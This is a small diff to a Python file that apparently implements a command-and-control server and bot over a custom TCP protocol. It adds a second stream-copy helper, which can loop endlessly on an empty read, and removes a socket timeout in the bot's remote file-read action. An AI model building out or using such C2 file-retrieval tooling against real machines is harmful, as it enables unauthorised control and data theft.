@@ -385,6 +385,15 @@ def copy_stream(src, dst, count):
         count = count - len(buffer)
         dst.write(buffer)
 
+def copy_stream2(src, dst, count):
+    read_bytes = 0
+    while read_bytes < count:
+        buffer = src.read(16)
+        if not buffer:
+            continue
+        count = count - len(buffer)
+        dst.write(buffer)
+
 ##############################################################################
 # C&C server over a custom TCP protocol.
 
@@ -657,6 +666,7 @@ class Bot(object):
     @bot_action
     def file_read(self, remote_file, local_file):
         self.sock.sendall( build_command(CMD_FILE_READ, remote_file) )
+        self.sock.settimeout(None)
         data_len = get_resp_header(self.sock)
         with open(local_file, "wb") as fd:
             copy_stream(self.sock.makefile(), fd, data_len)
